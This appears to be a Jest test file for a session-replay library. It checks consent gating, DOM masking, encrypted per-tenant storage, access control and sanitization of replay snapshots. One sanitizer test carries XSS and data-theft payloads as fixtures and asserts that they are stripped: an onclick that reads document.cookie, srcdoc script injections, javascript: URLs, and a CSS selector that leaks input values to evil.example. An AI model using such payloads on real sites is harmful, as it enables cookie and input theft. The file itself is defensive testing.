import crypto from 'node:crypto';
import { AuditLogStore, type VerifiedPrincipal } from '@/lib/link/auth';
import { isUntrustedValue } from '@/packages/contract/response';
import {
  DEFAULT_MASK_ALL_CONFIG,
  REPLAY_LANE_ISOLATION,
  ReplayObjectStore,
  authorizeReplayView,
  buildIsolatedReplayFrame,
  buildMcpReplaySummary,
  createCrawlReferenceTextOverlay,
  decideReplayEncoding,
  decryptReplayPayload,
  encryptReplayPayload,
  evaluateReplayEntitlement,
  maskReplayDomTree,
  runReplayZeroLeakCanaryGate,
  sanitizeReplayMutationNodes,
  shouldLazyLoadReplayRecorder,
  verifySandboxFrameSafety,
  type ReplaySitePolicy,
} from './index';

const BASE_SITE: ReplaySitePolicy = {
  tenantId: 'tenant_a',
  siteId: 'site_a1',
  siteOptInEnabled: true,
  sensitiveIndustry: false,
  directedAtMinors: false,
  sampleRate: 1.0,
  retentionDays: 30,
  d26MemberReplayApproved: false,
};

const APPROVED_D26 = { approved: true, legalSignedOff: true };

describe('lib/link/replay — Tier-3 Session Replay Entitlement, Masking, Baseline Diff, Object Store, Sandbox & Zero-Leak Canary Gate', () => {
  test('defaults to not_entitled until D-26 + legal sign-off, enforces lane isolation, blocks off/cookieless/stats_exempt, and auto-stops sensitive/minors/password/payment/member PVs', () => {
    expect(REPLAY_LANE_ISOLATION.lane).toBe('session_replay');
    expect(REPLAY_LANE_ISOLATION.countsTowardBillablePvs).toBe(false);
    expect(REPLAY_LANE_ISOLATION.allowInCrossTenantPool).toBe(false);
    expect(REPLAY_LANE_ISOLATION.allowInMlTraining).toBe(false);
    expect(REPLAY_LANE_ISOLATION.usesClickHouseMemory).toBe(false);

    // Real ledger D-26 is pending -> MUST fail closed as `not_entitled`!
    const defaultClosed = evaluateReplayEntitlement(BASE_SITE, {
      consentMode: 'full',
      grantedPurposes: ['page_content', 'screen_replay'],
      gpcEnabled: false,
      isMemberLinked: false,
      hasPasswordField: false,
      hasPaymentField: false,
      hasSensitiveMarkedField: false,
    });
    expect(defaultClosed.allowed).toBe(false);
    if (!defaultClosed.allowed) {
      expect(defaultClosed.status).toBe('not_entitled');
      expect(defaultClosed.code).toBe('D26_DECISION_OR_LEGAL_PENDING');
    }

    // With simulated D-26 approval: off / cookieless / stats_exempt are STILL blocked
    for (const badMode of ['off', 'cookieless', 'stats_exempt'] as const) {
      const r = evaluateReplayEntitlement(BASE_SITE, {
        consentMode: badMode,
        grantedPurposes: ['screen_replay'],
        gpcEnabled: false,
        isMemberLinked: false,
        hasPasswordField: false,
        hasPaymentField: false,
        hasSensitiveMarkedField: false,
        d26ApprovedOverrideForTest: APPROVED_D26,
      });
      expect(r.allowed).toBe(false);
      if (!r.allowed) expect(r.code).toBe('CONSENT_MODE_FORBIDS_REPLAY');
    }

    // Hard auto-stops: sensitive industry, minors, password/payment PV, member PV without member_link + D-26 member approval
    expect(
      evaluateReplayEntitlement(
        { ...BASE_SITE, sensitiveIndustry: true },
        {
          consentMode: 'full',
          grantedPurposes: ['screen_replay'],
          gpcEnabled: false,
          isMemberLinked: false,
          hasPasswordField: false,
          hasPaymentField: false,
          hasSensitiveMarkedField: false,
          d26ApprovedOverrideForTest: APPROVED_D26,
        }
      ).allowed
    ).toBe(false);

    expect(
      evaluateReplayEntitlement(
        { ...BASE_SITE, directedAtMinors: true },
        {
          consentMode: 'full',
          grantedPurposes: ['screen_replay'],
          gpcEnabled: false,
          isMemberLinked: false,
          hasPasswordField: false,
          hasPaymentField: false,
          hasSensitiveMarkedField: false,
          d26ApprovedOverrideForTest: APPROVED_D26,
        }
      ).allowed
    ).toBe(false);

    const passwordStop = evaluateReplayEntitlement(BASE_SITE, {
      consentMode: 'full',
      grantedPurposes: ['screen_replay'],
      gpcEnabled: false,
      isMemberLinked: false,
      hasPasswordField: true,
      hasPaymentField: false,
      hasSensitiveMarkedField: false,
      d26ApprovedOverrideForTest: APPROVED_D26,
    });
    expect(passwordStop.allowed).toBe(false);
    if (!passwordStop.allowed) {
      expect(passwordStop.code).toBe('AUTO_STOP_SENSITIVE_PV_DISCARDED');
      expect(passwordStop.discardExistingBuffer).toBe(true);
    }

    const memberExcluded = evaluateReplayEntitlement(BASE_SITE, {
      consentMode: 'full',
      grantedPurposes: ['screen_replay', 'member_link'],
      gpcEnabled: false,
      isMemberLinked: true,
      hasPasswordField: false,
      hasPaymentField: false,
      hasSensitiveMarkedField: false,
      d26ApprovedOverrideForTest: APPROVED_D26,
    });
    expect(memberExcluded.allowed).toBe(false);
    if (!memberExcluded.allowed) expect(memberExcluded.code).toBe('MEMBER_PV_EXCLUDED_BY_DEFAULT');

    // Valid anonymous visit with D-26 + full + session_replay -> allowed
    const ok = evaluateReplayEntitlement(BASE_SITE, {
      consentMode: 'full',
      grantedPurposes: ['page_content', 'screen_replay'],
      gpcEnabled: false,
      isMemberLinked: false,
      hasPasswordField: false,
      hasPaymentField: false,
      hasSensitiveMarkedField: false,
      d26ApprovedOverrideForTest: APPROVED_D26,
    });
    expect(ok.allowed).toBe(true);
  });

  test('CRAWL baseline requires all 5 tuple fields to emit delta; any mismatch switches to full_masked_snapshot; public text overlay marked reference_not_recorded', () => {
    const baseTuple = {
      skelFp: 'skel_123',
      maskedInitialStateHash: 'hash_abc',
      assetVersion: 'assets_v9',
      activeVariantSetHash: 'vars_001',
      maskConfigVersion: 'mask-all-v1',
    };

    const match = decideReplayEncoding(baseTuple, { ...baseTuple, snapshotId: 'snap_1' });
    expect(match.encoding).toBe('delta');
    expect(match.matched).toBe(true);
    expect(match.baselineSnapshotId).toBe('snap_1');

    // Same skelFp but changed maskConfigVersion -> MUST fall back to full_masked_snapshot!
    const mismatch = decideReplayEncoding(
      { ...baseTuple, maskConfigVersion: 'mask-allow-v2' },
      { ...baseTuple, snapshotId: 'snap_1' }
    );
    expect(mismatch.encoding).toBe('full_masked_snapshot');
    expect(mismatch.matched).toBe(false);
    expect(mismatch.mismatchedFields).toEqual(['maskConfigVersion']);

    // Reference public text overlay strictly distinguished from recorded session data & wrapped in UntrustedValue
    const overlay = createCrawlReferenceTextOverlay({
      crawlSnapshotId: 'snap_1',
      sectionFp: 'sec_hero',
      publicText: 'Welcome to our public landing page',
    });
    expect(overlay.overlayKind).toBe('reference_not_recorded');
    expect(overlay.recordedInSession).toBe(false);
    expect(isUntrustedValue(overlay.publicText)).toBe(true);
  });

  test('Object-storage-only store enforces lazy loading, >=50-PV k-anon selection, disposable handles, and 14-day deletion purge', () => {
    const store = new ReplayObjectStore();
    const key = crypto.randomBytes(32);
    const now = new Date('2026-11-20T12:00:00Z');

    // Lazy loader skips when sampleRate = 0
    expect(
      shouldLazyLoadReplayRecorder({
        site: { ...BASE_SITE, sampleRate: 0 },
        visit: {
          consentMode: 'full',
          grantedPurposes: ['screen_replay'],
          gpcEnabled: false,
          isMemberLinked: false,
          hasPasswordField: false,
          hasPaymentField: false,
          hasSensitiveMarkedField: false,
          d26ApprovedOverrideForTest: APPROVED_D26,
        },
        pvId: 'pv_1',
        samplingSalt: 'salt_1',
      }).loadRecorder
    ).toBe(false);

    const masked = maskReplayDomTree(
      {
        nodeId: 'root',
        kind: 'element',
        tagName: 'div',
        rect: { x: 0, y: 0, width: 800, height: 600 },
        textContent: 'Confidential',
      },
      DEFAULT_MASK_ALL_CONFIG
    );

    const meta = store.putReplay({
      tenantId: 'tenant_a',
      siteId: 'site_a1',
      pvId: 'pv_store_1',
      chunkSeq: 0,
      subjectKeyHash: 'subj_hash_001',
      snapshot: masked,
      encoding: 'full_masked_snapshot',
      tenantKey32Bytes: key,
      keyVersion: 'tk_v1',
      now,
    });
    expect(meta.ok).toBe(true);
    if (!meta.ok) throw new Error('Expected replay to be stored');
    expect(meta.storageBackend).toBe('object_storage_r2');
    expect(meta.usesClickHouseMemory).toBe(false);
    expect(store.countBillableReplaySessions('tenant_a', 'site_a1')).toBe(1);

    // Filter matching < 50 PVs -> suppressed
    const tooSmall = store.selectReplaysForFilter({
      tenantId: 'tenant_a',
      siteId: 'site_a1',
      matchedFilterPvCount: 49,
      now,
    });
    expect(tooSmall.ok).toBe(false);
    if (!tooSmall.ok) expect(tooSmall.code).toBe('FILTER_BELOW_50_PV_FLOOR');

    // Filter matching >= 50 PVs -> returns disposable handle (different per answer!)
    const sel1 = store.selectReplaysForFilter({
      tenantId: 'tenant_a',
      siteId: 'site_a1',
      matchedFilterPvCount: 50,
      now,
    });
    const sel2 = store.selectReplaysForFilter({
      tenantId: 'tenant_a',
      siteId: 'site_a1',
      matchedFilterPvCount: 50,
      now,
    });
    expect(sel1.ok).toBe(true);
    expect(sel2.ok).toBe(true);
    if (!sel1.ok || !sel2.ok) return;
    expect(sel1.handles[0].handle).not.toBe(sel2.handles[0].handle);

    // Fetch works for own tenant on first redeem, fails 403 on second redeem (single-use!), fails 404 for foreign tenant
    expect(
      store.fetchByHandle({
        handle: sel1.handles[0].handle,
        tenantId: 'tenant_a',
        siteId: 'site_a1',
        tenantKey32Bytes: key,
        now,
      }).ok
    ).toBe(true);
    const secondRedeem = store.fetchByHandle({
      handle: sel1.handles[0].handle,
      tenantId: 'tenant_a',
      siteId: 'site_a1',
      tenantKey32Bytes: key,
      now,
    });
    expect(secondRedeem.ok).toBe(false);
    if (!secondRedeem.ok) {
      expect(secondRedeem.httpStatus).toBe(403);
      expect(secondRedeem.snapshot).toBeNull();
      expect(secondRedeem.code).toBe('HANDLE_ALREADY_CONSUMED');
    }
    expect(
      store.fetchByHandle({
        handle: sel2.handles[0].handle,
        tenantId: 'tenant_b',
        siteId: 'site_a1',
        tenantKey32Bytes: key,
        now,
      }).ok
    ).toBe(false);

    // 14-day deletion purge physically removes object and invalidates unredeemed handle sel2
    const purge = store.purgeSubjectReplays('tenant_a', 'subj_hash_001', now);
    expect(purge.purgedReplayIds).toEqual([meta.replayId]);
    expect(purge.residualObjects).toBe(0);
    expect(
      store.fetchByHandle({
        handle: sel2.handles[0].handle,
        tenantId: 'tenant_a',
        siteId: 'site_a1',
        tenantKey32Bytes: key,
        now,
      }).ok
    ).toBe(false);
  });

  test('Isolated sandbox HTML enforces empty sandbox="", strict CSP, replay:view auth (blocking OEM & CRAWL), and MCP summary-only UntrustedValue output', () => {
    const masked = maskReplayDomTree(
      {
        nodeId: 'root',
        kind: 'element',
        tagName: 'div',
        rect: { x: 0, y: 0, width: 1000, height: 800 },
        children: [
          {
            nodeId: 'c1',
            kind: 'canvas',
            tagName: 'canvas',
            rect: { x: 0, y: 0, width: 200, height: 100 },
          },
          {
            nodeId: 's1',
            kind: 'element',
            tagName: 'script',
            rect: { x: 0, y: 0, width: 0, height: 0 },
            textContent: 'alert("xss")',
          },
        ],
      },
      DEFAULT_MASK_ALL_CONFIG
    );

    const frame = buildIsolatedReplayFrame(masked);
    const safety = verifySandboxFrameSafety(frame);
    expect(safety.safe).toBe(true);
    expect(safety.violations).toEqual([]);

    const auditLog = new AuditLogStore();
    const ownHuman: VerifiedPrincipal = {
      credentialKind: 'session_cookie',
      credentialId: 'sess_1',
      tenantId: 'tenant_a',
      orgId: 'org_a',
      allowedSiteIds: null,
      principalKind: 'human',
      principalId: 'user_a',
      role: 'admin',
      effectiveScopes: new Set(['analytics:read']),
      senderConstrained: true,
      passkeyVerified: true,
    };

    // Allowed for own human with `replay:view`
    expect(
      authorizeReplayView({
        principal: ownHuman,
        hasReplayViewPermission: true,
        targetTenantId: 'tenant_a',
        targetSiteId: 'site_a1',
        replayHandle: 'rph_1',
        auditLog,
      }).allowed
    ).toBe(true);

    // Denied 403 for OEM exchanged token even inside child tenant!
    const oemParent: VerifiedPrincipal = {
      ...ownHuman,
      credentialKind: 'oem_exchanged',
      act: { sub: 'oem_op', oemKeyId: 'oem_1', managementTenantId: 'tenant_oem' },
    };
    const oemRes = authorizeReplayView({
      principal: oemParent,
      hasReplayViewPermission: true,
      targetTenantId: 'tenant_a',
      targetSiteId: 'site_a1',
      replayHandle: 'rph_1',
      auditLog,
    });
    expect(oemRes.allowed).toBe(false);
    expect(oemRes.code).toBe('REPLAY_THIRD_PARTY_FORBIDDEN');

    // Denied 403 for CRAWL federation assertion
    const crawlFed: VerifiedPrincipal = { ...ownHuman, credentialKind: 'federation_assertion' };
    expect(
      authorizeReplayView({
        principal: crawlFed,
        hasReplayViewPermission: true,
        targetTenantId: 'tenant_a',
        targetSiteId: 'site_a1',
        replayHandle: 'rph_1',
        auditLog,
      }).code
    ).toBe('REPLAY_THIRD_PARTY_FORBIDDEN');

    // Foreign tenant -> 404
    expect(
      authorizeReplayView({
        principal: ownHuman,
        hasReplayViewPermission: true,
        targetTenantId: 'tenant_b',
        targetSiteId: 'site_b1',
        replayHandle: 'rph_1',
        auditLog,
      }).httpStatus
    ).toBe(404);
    expect(auditLog.verifyChain().valid).toBe(true);

    // MCP summary never includes raw DOM and wraps notes in UntrustedValue
    const mcpSummary = buildMcpReplaySummary('rph_1', masked);
    expect(mcpSummary.containsRawDom).toBe(false);
    expect(isUntrustedValue(mcpSummary.summaryNote)).toBe(true);
    expect(mcpSummary.unreproducibleRegions).toHaveLength(1);
    expect(isUntrustedValue(mcpSummary.unreproducibleRegions[0].disclosureNote)).toBe(true);
  });

  test('Post-decrypt + post-decompress zero-leak canary gate (surf.replay_zero_leak) passes with 0 recoverable canaries in BOTH default and partial-allowlist modes', () => {
    const report = runReplayZeroLeakCanaryGate();
    expect(report.gateId).toBe('surf.replay_zero_leak');
    expect(report.ledgerRegistered).toBe(true);
    expect(report.defaultModeLeakedCanaries).toEqual([]);
    expect(report.allowlistModeLeakedCanaries).toEqual([]);
    expect(report.allowlistedSafeTextPreserved).toBe(true);
    expect(report.totalLeaks).toBe(0);
    expect(report.passed).toBe(true);
  });

  test('[H-13] strips <script>/<style>/<noscript>/<template>/<svg><foreignObject>/<iframe>/<object>/<embed> & event attrs inside data-ugk-replay="allow" and MutationObserver insertions, hard-rejects sensitive pages in putReplay, and enforces AES-GCM AAD binding', () => {
    const allowConfig = {
      maskConfigVersion: 'mask-allow-v3',
      approvalId: 'apr_sec_1',
      allowedKeys: ['allowed_zone'],
    };

    // 1. Forbidden elements & event/srcdoc/javascript: attrs inside `data-ugk-replay="allow"` are 100% stripped!
    const snapshot = maskReplayDomTree(
      {
        nodeId: 'root',
        kind: 'element',
        tagName: 'section',
        allowlistKey: 'allowed_zone',
        attributes: {
          'data-ugk-replay': 'allow',
          onclick: 'alert(document.cookie)',
          onmouseover: 'steal()',
          srcdoc: '<script>evil()</script>',
          href: 'javascript:evil()',
        },
        rect: { x: 0, y: 0, width: 800, height: 600 },
        children: [
          {
            nodeId: 'safe_txt',
            kind: 'text',
            tagName: '#text',
            rect: { x: 0, y: 0, width: 200, height: 24 },
            textContent: 'Approved Public Heading',
          },
          {
            nodeId: 'evil_script',
            kind: 'element',
            tagName: 'script',
            rect: { x: 0, y: 0, width: 0, height: 0 },
            textContent: 'const SECRET_INLINE_TOKEN = "LEAK_SCRIPT_1";',
          },
          {
            nodeId: 'evil_style',
            kind: 'element',
            tagName: 'style',
            rect: { x: 0, y: 0, width: 0, height: 0 },
            textContent: 'input[value^="a"]{background:url(https://evil.example/LEAK_STYLE_2)}',
          },
          {
            nodeId: 'evil_noscript',
            kind: 'element',
            tagName: 'noscript',
            rect: { x: 0, y: 0, width: 0, height: 0 },
            textContent: 'LEAK_NOSCRIPT_3',
          },
          {
            nodeId: 'evil_template',
            kind: 'element',
            tagName: 'template',
            rect: { x: 0, y: 0, width: 0, height: 0 },
            textContent: 'LEAK_TEMPLATE_4',
          },
          {
            nodeId: 'svg_wrap',
            kind: 'element',
            tagName: 'svg',
            rect: { x: 0, y: 30, width: 100, height: 100 },
            children: [
              {
                nodeId: 'evil_fo',
                kind: 'element',
                tagName: 'foreignObject',
                rect: { x: 0, y: 0, width: 100, height: 100 },
                textContent: 'LEAK_FOREIGN_OBJECT_5',
              },
            ],
          },
          {
            nodeId: 'evil_iframe',
            kind: 'element',
            tagName: 'iframe',
            attributes: { srcdoc: '<script>LEAK_SRCDOC_6</script>', src: 'javascript:LEAK_JS_7' },
            rect: { x: 0, y: 140, width: 300, height: 150 },
            textContent: 'LEAK_IFRAME_TEXT_8',
          },
          {
            nodeId: 'evil_object',
            kind: 'element',
            tagName: 'object',
            attributes: { data: 'https://evil.example/LEAK_OBJECT_9' },
            rect: { x: 0, y: 300, width: 100, height: 100 },
          },
          {
            nodeId: 'evil_embed',
            kind: 'element',
            tagName: 'embed',
            attributes: { src: 'https://evil.example/LEAK_EMBED_10' },
            rect: { x: 0, y: 400, width: 100, height: 100 },
          },
        ],
      },
      allowConfig
    );

    const serializedSnap = JSON.stringify(snapshot);
    expect(serializedSnap).toContain('Approved Public Heading');
    for (const forbidden of [
      'LEAK_SCRIPT_1',
      'LEAK_STYLE_2',
      'LEAK_NOSCRIPT_3',
      'LEAK_TEMPLATE_4',
      'LEAK_FOREIGN_OBJECT_5',
      'LEAK_SRCDOC_6',
      'LEAK_JS_7',
      'LEAK_IFRAME_TEXT_8',
      'LEAK_OBJECT_9',
      'LEAK_EMBED_10',
      'onclick',
      'onmouseover',
      'srcdoc',
      'javascript:',
    ]) {
      expect(serializedSnap).not.toContain(forbidden);
    }

    const rendered = buildIsolatedReplayFrame(snapshot);
    expect(verifySandboxFrameSafety(rendered).safe).toBe(true);

    // 2. Incremental MutationObserver insertions inside an allowlisted parent re-run the exact same sanitizer!
    const mutBatch = sanitizeReplayMutationNodes(
      [
        {
          nodeId: 'mut_script',
          kind: 'element',
          tagName: 'script',
          rect: { x: 0, y: 0, width: 0, height: 0 },
          textContent: 'LEAK_MUTATION_SCRIPT',
        },
        {
          nodeId: 'mut_ssn_input',
          kind: 'input',
          tagName: 'input',
          attributes: { name: 'ssn_number', onclick: 'evil()' },
          inputValue: '123-45-6789',
          rect: { x: 0, y: 0, width: 200, height: 32 },
        },
      ],
      allowConfig,
      { parentAllowlisted: true }
    );
    expect(mutBatch.nodes).toHaveLength(1); // <script> stripped, input masked
    expect(mutBatch.nodes[0].textBlock).toBe('[REDACTED_INPUT]');
    expect(mutBatch.detectedSensitiveFieldOnPage).toBe(true);
    expect(JSON.stringify(mutBatch)).not.toContain('LEAK_MUTATION_SCRIPT');
    expect(JSON.stringify(mutBatch)).not.toContain('123-45-6789');

    // 3. putReplay HARD-REJECTS storing any snapshot with detectedSensitiveFieldOnPage === true and zeroes buffer!
    const store = new ReplayObjectStore();
    const key = crypto.randomBytes(32);
    const sensitiveSnap = maskReplayDomTree({
      nodeId: 'root',
      kind: 'element',
      tagName: 'div',
      rect: { x: 0, y: 0, width: 500, height: 400 },
      children: [
        {
          nodeId: 'health_field',
          kind: 'input',
          tagName: 'input',
          attributes: { name: 'medical_diagnosis' },
          inputValue: 'secret diagnosis',
          rect: { x: 0, y: 0, width: 200, height: 30 },
        },
      ],
    });
    expect(sensitiveSnap.detectedSensitiveFieldOnPage).toBe(true);

    const rawBuf = Buffer.from('SENSITIVE_BUFFER_BYTES_IN_RAM', 'utf8');
    const rejected = store.putReplay({
      tenantId: 'tenant_a',
      siteId: 'site_a1',
      pvId: 'pv_sens_1',
      chunkSeq: 0,
      subjectKeyHash: 'subj_1',
      snapshot: sensitiveSnap,
      encoding: 'full_masked_snapshot',
      tenantKey32Bytes: key,
      keyVersion: 'v1',
      rawBufferToZero: rawBuf,
    });
    expect(rejected.ok).toBe(false);
    expect(rejected.status).toBe('blocked_sensitive_page');
    expect(rawBuf.every((b) => b === 0)).toBe(true);
    expect(store.countBillableReplaySessions('tenant_a', 'site_a1')).toBe(0);

    // 4. AES-256-GCM AAD prevents cross-tenant, cross-site, cross-PV, or cross-chunkSeq ciphertext transplant!
    const aadLegit = { tenantId: 'tenant_a', siteId: 'site_a1', pvId: 'pv_100', chunkSeq: 0 };
    const enc = encryptReplayPayload({ hello: 'world' }, key, 'v1', aadLegit);
    expect(decryptReplayPayload(enc, key, aadLegit).parsed).toEqual({ hello: 'world' });

    expect(() =>
      decryptReplayPayload(enc, key, { ...aadLegit, tenantId: 'tenant_b' })
    ).toThrow();
    expect(() =>
      decryptReplayPayload(enc, key, { ...aadLegit, siteId: 'site_other' })
    ).toThrow();
    expect(() =>
      decryptReplayPayload(enc, key, { ...aadLegit, pvId: 'pv_999' })
    ).toThrow();
    expect(() =>
      decryptReplayPayload(enc, key, { ...aadLegit, chunkSeq: 1 })
    ).toThrow();
  });
});
